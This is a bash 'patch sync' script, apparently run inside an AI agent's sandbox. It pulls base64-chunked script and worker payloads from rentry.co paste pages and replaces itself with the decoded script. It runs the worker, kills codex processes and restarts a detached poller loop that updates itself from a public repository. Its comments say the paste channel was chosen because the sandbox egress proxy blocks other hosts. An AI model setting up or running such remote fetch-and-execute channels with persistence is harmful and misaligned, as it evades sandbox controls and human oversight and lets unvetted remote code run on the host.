#!/usr/bin/env bash
# sync_patch_from_pointer.sh — 沙箱内运行：从 rentry 拉取并应用最新补丁版 + 驱动总线工人
#
# v5（2026-10-02）：+ 解卡：杀阻塞 poller 的 codex 孙进程（v9 管道冻结事故的 runtime 兜底）。
# v4（2026-10-02）：分发通道改为 **rentry blobs 页**（沙箱出口代理可达），catbox 仅作兜底。
#   背景：catbox 在沙箱侧被代理拦（Empty reply），rentry 双向可达。
#   v3：① 指针页解析去 <head> + 行首锚定（防 meta 截断/子串误匹配）
#       ② worker 自举 + 自更新  ③ 工人调用节流 240s
#   v4：④ 脚本/工人产物改为 rentry blobs 页 chunked base64 分发
set -euo pipefail
PTR_URL="${1:-https://rentry.co/hermes-muse-ptr}"
TARGET_DIR="${TARGET_DIR:-$HOME/newapi-test}"
STATE_FILE="$TARGET_DIR/current-version.txt"
LOG_FILE="$TARGET_DIR/patch-sync.log"
SELF="$(readlink -f "$0" 2>/dev/null || echo "$0")"
GB="$HOME/.hermes-gitbus"
BUS_ROLE="${BUS_ROLE:-muse}"
UA="Mozilla/5.0"

log() { echo "[$(date '+%F %T')] $*" | tee -a "$LOG_FILE"; }

mkdir -p "$TARGET_DIR"

# ---------- 从 rentry 页提取 key=value（去 <head> + 行首锚定） ----------
fetch_fields() {  # $1=slug  -> "key\tvalue" 行
  python3 - "$1" <<'PYEOF'
import sys, re, html as H, urllib.request, time
slug = sys.argv[1]
url = slug if slug.startswith("http") else "https://rentry.co/%s" % slug
url = url if url.endswith("/edit") else url + "/edit"
txt = ""
for i in range(4):
    try:
        h = urllib.request.urlopen(urllib.request.Request(
            url, headers={"User-Agent": "Mozilla/5.0"}), timeout=30).read().decode("utf-8", "replace")
        m = re.search(r"<textarea[^>]*>(.*?)</textarea>", h, re.S)
        if m:
            txt = H.unescape(m.group(1))
            break
    except Exception:
        pass
    time.sleep(3)
if not txt:
    sys.exit("pointer fetch failed")
for mm in re.finditer(r"(?m)^[ \t]*([A-Za-z0-9_]+)=(.*)$", txt):
    print("%s\t%s" % (mm.group(1), mm.group(2).strip()))
PYEOF
}

# ---------- 从 rentry blobs 页解码 chunked base64 产物（stdout 为二进制） ----------
fetch_blob() {  # $1=blobs_slug  $2=prefix(script|worker)
  python3 - "$1" "$2" <<'PYEOF'
import sys, re, html as H, base64, urllib.request, time
slug, prefix = sys.argv[1], sys.argv[2]
txt = ""
for i in range(4):
    try:
        h = urllib.request.urlopen(urllib.request.Request(
            "https://rentry.co/%s/edit" % slug, headers={"User-Agent": "Mozilla/5.0"}), timeout=60
        ).read().decode("utf-8", "replace")
        m = re.search(r"<textarea[^>]*>(.*?)</textarea>", h, re.S)
        if m:
            txt = H.unescape(m.group(1))
            break
    except Exception:
        pass
    time.sleep(3)
parts = re.findall(r"(?m)^[ \t]*" + re.escape(prefix) + r"_b64_(\d+)=([A-Za-z0-9+/=]+)", txt)
if not parts:
    sys.exit("no chunks for %s" % prefix)
parts.sort(key=lambda x: int(x[0]))
sys.stdout.buffer.write(base64.b64decode("".join(p[1] for p in parts)))
PYEOF
}

# ---------- 解卡：杀阻塞 poller 的 codex 孙进程（2026-10-02 管道冻结事故兜底） ----------
# 背景：poller v9 超时只杀直接子进程；codex 派生的孙进程继续持有 stdout 管道 ->
# 读端永久阻塞 -> 60s 循环「活着但冻结」，看门狗只判存活不自愈（实测冻 >25min）。
# v10 已修（独立进程组 + killpg）；此处 runtime 兜底：杀掉 codex 进程 -> 管道 EOF ->
# 被冻的 poller communicate() 自然返回并继续循环。不杀 poller、不碰 watchdog。幂等。
unblock() {
  local pids="" p n=0
  pids=$(pgrep -x codex 2>/dev/null || true)
  if [ -z "$pids" ]; then pids=$(pgrep -f "bin/codex" 2>/dev/null || true); fi
  for p in $pids; do
    case "$(tr "\0" " " < "/proc/$p/cmdline" 2>/dev/null || true)" in
      *while*true*) continue;;   # 防自伤：循环本体不碰
    esac
    kill -9 "$p" 2>/dev/null && n=$((n + 1))
  done
  if [ "$n" -gt 0 ]; then
    log "UNBLOCK: killed $n codex proc(s) (frozen poller will resume)"
  fi
  # 循环本体若没了则补起（poller 每轮从公开仓库自升级，会取到 v10）
  if ! pgrep -f "muse_git_poller.py" >/dev/null 2>&1; then
    setsid nohup bash -c 'while true; do python3 "$HOME/.hermes-gitbus/muse_git_poller.py" >> "$HOME/.hermes-gitbus/git_poller.log" 2>&1; sleep 60; done' </dev/null >/dev/null 2>&1 &
    log "UNBLOCK: poller loop restarted"
  fi
  return 0
}

# ---------- 拉取指针 ----------
META=$(fetch_fields "$PTR_URL") || true
if [ -z "$META" ]; then
  log "WARN: failed to fetch pointer $PTR_URL"
  unblock
  exit 0
fi
pv() { printf '%s\n' "$META" | awk -F'\t' -v k="$1" '$1==k{print $2; exit}'; }
VER=$(pv version)
URL=$(pv url)
SHABIN=$(pv sha256_bin)
SHAGZ=$(pv sha256_gz)
SCRIPT_URL=$(pv sync_script_url)
SCRIPT_SHA=$(pv sync_script_sha)
WORKER_URL=$(pv worker_url)
WORKER_SHA=$(pv worker_sha)
BLOBS_SLUG=$(pv blobs_slug)

# 取产物：优先 blobs 页，失败则回退 URL
get_artifact() {  # $1=prefix $2=sha $3=fallback_url $4=outfile
  local prefix="$1" want="$2" fburl="$3" out="$4"
  if [ -n "$BLOBS_SLUG" ]; then
    if fetch_blob "$BLOBS_SLUG" "$prefix" > "$out" 2>/dev/null && [ -s "$out" ]; then
      if [ -z "$want" ] || [ "$(sha256sum "$out" | awk '{print $1}')" = "$want" ]; then
        return 0
      fi
      log "blob $prefix sha mismatch, trying fallback"
    fi
  fi
  if [ -n "$fburl" ]; then
    curl -fsSL --max-time 300 -A "$UA" -o "$out" "$fburl" || return 1
    if [ -n "$want" ] && [ "$(sha256sum "$out" | awk '{print $1}')" != "$want" ]; then
      return 1
    fi
    return 0
  fi
  return 1
}

# ---------- 脚本自更新（一次性，防循环） ----------
if [ "${SYNC_NO_SELFUPDATE:-0}" != "1" ] && [ -n "$SCRIPT_SHA" ] && [ -f "$SELF" ]; then
  CUR_SELF_SHA=$(sha256sum "$SELF" | awk '{print $1}')
  if [ "$CUR_SELF_SHA" != "$SCRIPT_SHA" ]; then
    log "SELF-UPDATE: script changed ($CUR_SELF_SHA -> $SCRIPT_SHA), fetching ..."
    if get_artifact script "$SCRIPT_SHA" "$SCRIPT_URL" "$SELF.new"; then
      chmod +x "$SELF.new"
      mv -f "$SELF.new" "$SELF"
      log "SELF-UPDATE: applied, re-exec"
      SYNC_NO_SELFUPDATE=1 exec /bin/bash "$SELF" "$@"
    else
      log "SELF-UPDATE: fetch failed, continue with current script"
      rm -f "$SELF.new"
    fi
  fi
fi

# ---------- 总线工人自举 ----------
bootstrap_worker() {
  mkdir -p "$GB"
  local W="$GB/bus_worker.py" CUR=""
  if [ -f "$W" ]; then CUR=$(sha256sum "$W" | awk '{print $1}'); fi
  if [ -n "$WORKER_SHA" ] && [ "$CUR" != "$WORKER_SHA" ]; then
    log "WORKER: installing/updating ($CUR -> $WORKER_SHA)"
    if get_artifact worker "$WORKER_SHA" "$WORKER_URL" "$W.new"; then
      chmod +x "$W.new"; mv -f "$W.new" "$W"; log "WORKER: installed OK"
    else
      log "WORKER: fetch failed (blobs+fallback)"; rm -f "$W.new"
    fi
  fi
  if [ -f "$W" ]; then
    local STAMP="$GB/worker.stamp" NOW LAST=0
    NOW=$(date +%s)
    [ -f "$STAMP" ] && LAST=$(cat "$STAMP" 2>/dev/null || echo 0)
    if [ $((NOW - LAST)) -ge 240 ]; then
      echo "$NOW" > "$STAMP"
      if command -v timeout >/dev/null 2>&1; then
        BUS_ROLE="$BUS_ROLE" PTR_URL="$PTR_URL" timeout 900 python3 "$W" >> "$GB/worker.out" 2>&1 \
          || log "WORKER: run rc=$?"
      else
        BUS_ROLE="$BUS_ROLE" PTR_URL="$PTR_URL" python3 "$W" >> "$GB/worker.out" 2>&1 \
          || log "WORKER: run rc=$?"
      fi
    fi
  fi
}

# ---------- 判定当前实际运行中的二进制 ----------
find_running() {  # ok / none
  local p exe cmd sha
  for p in $(pgrep -f 'new-api' 2>/dev/null || true); do
    [ -e "/proc/$p/exe" ] || continue
    exe=$(readlink -f "/proc/$p/exe" 2>/dev/null || true)
    case "$exe" in *"$TARGET_DIR"*) ;; *) continue ;; esac
    cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null || true)
    case "$cmd" in *"--port 3000"*) ;; *) continue ;; esac
    sha=$(sha256sum "/proc/$p/exe" 2>/dev/null | awk '{print $1}' || true)
    if [ "$sha" = "$SHABIN" ]; then echo "ok"; return; fi
  done
  echo "none"
}

stop_server() {
  local p exe cmd
  for p in $(pgrep -f 'new-api' 2>/dev/null || true); do
    [ -e "/proc/$p/exe" ] || continue
    exe=$(readlink -f "/proc/$p/exe" 2>/dev/null || true)
    case "$exe" in *"$TARGET_DIR"*) ;; *) continue ;; esac
    cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null || true)
    case "$cmd" in *"--port 3000"*) kill "$p" 2>/dev/null || true;; esac
  done
  sleep 2
  for p in $(pgrep -f 'new-api' 2>/dev/null || true); do
    [ -e "/proc/$p/exe" ] || continue
    exe=$(readlink -f "/proc/$p/exe" 2>/dev/null || true)
    case "$exe" in *"$TARGET_DIR"*) ;; *) continue ;; esac
    cmd=$(tr '\0' ' ' < "/proc/$p/cmdline" 2>/dev/null || true)
    case "$cmd" in *"--port 3000"*) kill -9 "$p" 2>/dev/null || true;; esac
  done
}

if [ -z "$VER" ] || [ -z "$URL" ] || [ -z "$SHABIN" ]; then
  log "WARN: pointer missing fields (ver=$VER url=$URL shabin=$SHABIN)"
  bootstrap_worker
  exit 0
fi

CURR=""
if [ -f "$STATE_FILE" ]; then CURR=$(tr -d ' \r\n' < "$STATE_FILE"); fi
BIN_EXISTS=0
if [ -f "$TARGET_DIR/new-api-$VER" ]; then
  ACT_SHA=$(sha256sum "$TARGET_DIR/new-api-$VER" | awk '{print $1}')
  if [ "$ACT_SHA" = "$SHABIN" ]; then BIN_EXISTS=1; fi
fi
RUNNING_BIN=$(find_running)

if [ "$CURR" = "$VER" ] && [ "$BIN_EXISTS" -eq 1 ] && [ "$RUNNING_BIN" = "ok" ]; then
  unblock
  bootstrap_worker
  exit 0
fi

unblock
log "DETECT: update needed -> target=$VER current=$CURR running=$RUNNING_BIN"

# ---------- 下载与校验 ----------
TMPGZ="$TARGET_DIR/incoming-$VER.gz"
TMPBIN="$TARGET_DIR/incoming-$VER.bin"
rm -f "$TMPGZ" "$TMPBIN"

log "downloading $URL ..."
if ! curl -fSL --max-time 900 -A "$UA" -o "$TMPGZ" "$URL"; then
  log "FAIL: download failed from $URL"; rm -f "$TMPGZ"; bootstrap_worker; exit 1
fi

if [ -n "$SHAGZ" ]; then
  ACT_GZ=$(sha256sum "$TMPGZ" | awk '{print $1}')
  if [ "$ACT_GZ" != "$SHAGZ" ]; then
    log "FAIL: gz sha256 mismatch (act=$ACT_GZ exp=$SHAGZ)"; rm -f "$TMPGZ"; bootstrap_worker; exit 1
  fi
  log "gz sha256 verified OK"
fi

gunzip -c "$TMPGZ" > "$TMPBIN"
rm -f "$TMPGZ"
chmod +x "$TMPBIN"

ACT_BIN=$(sha256sum "$TMPBIN" | awk '{print $1}')
if [ "$ACT_BIN" != "$SHABIN" ]; then
  log "FAIL: bin sha256 mismatch (act=$ACT_BIN exp=$SHABIN)"; rm -f "$TMPBIN"; bootstrap_worker; exit 1
fi
log "bin sha256 verified OK: $ACT_BIN"

# ---------- 安装 ----------
FINAL_BIN="$TARGET_DIR/new-api-$VER"
mv -f "$TMPBIN" "$FINAL_BIN"
mkdir -p "$TARGET_DIR/canonical"
cp -f "$FINAL_BIN" "$TARGET_DIR/canonical/new-api"

mkdir -p "$TARGET_DIR/backup-pre-$VER"
cp -f "$TARGET_DIR"/*.db "$TARGET_DIR/backup-pre-$VER/" 2>/dev/null || true

# ---------- 切换 ----------
log "restarting new-api to $FINAL_BIN ..."
stop_server
cd "$TARGET_DIR"
nohup "$FINAL_BIN" --port 3000 > "$TARGET_DIR/newapi-$VER.log" 2>&1 &

for _ in $(seq 1 20); do
  ST=$(curl -sS -o /dev/null -w '%{http_code}' --max-time 5 http://127.0.0.1:3000/ 2>/dev/null || echo "000")
  [ "$ST" = "200" ] && break
  sleep 1
done

if [ "$ST" = "200" ]; then
  echo "$VER" > "$STATE_FILE"
  log "SUCCESS: switched to $VER (http=200, sha=$ACT_BIN)"
else
  log "WARN: new-api started but http=$ST, check $TARGET_DIR/newapi-$VER.log"
fi

bootstrap_worker